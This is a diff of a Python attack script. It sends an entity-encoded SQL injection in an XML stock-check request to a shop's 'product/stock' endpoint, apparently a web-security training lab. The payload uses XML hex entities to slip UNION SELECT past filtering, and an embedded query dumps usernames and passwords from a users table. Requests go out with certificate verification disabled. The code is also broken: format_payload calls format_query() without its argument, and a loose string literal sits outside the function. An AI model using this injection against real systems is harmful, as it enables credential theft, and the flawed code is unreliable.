@@ -39,17 +39,24 @@ def format_query(query):
 
 def format_payload(query):
     formatted_query = format_query()
-    return f'''
-<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1{formatted_query} </storeId></stockCheck>
-'''
-    """
-    &#x55;NION &#x53;ELECT username || &#x27;~&#x27; || password &#x46;ROM users&#x2d;&#x2d;
-    """
+    return (
+f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId>'
+f"<storeId>1&#x20;{formatted_query} </storeId></stockCheck>"
+)
+"""
+   &#x55;NION &#x53;ELECT username || &#x27;~&#x27; || password &#x46;ROM users&#x2d;&#x2d;
+"""
 
 def main(args):
     sess = requests.Session()
     shop = Shop(args.url, args.no_proxy, sess)
-    shop
+    url = shop.base_url + "product/stock"
+    payload = format_payload("UNION SELECT 'abcd'")
+    if shop.no_proxy:
+        resp = requests.post(url, data=payload)
+    else:
+        resp = requests.post(url, data=payload, proxies=utils.PROXIES, verify=False)
+    print(resp.text)
     
     
 if __name__ == "__main__":
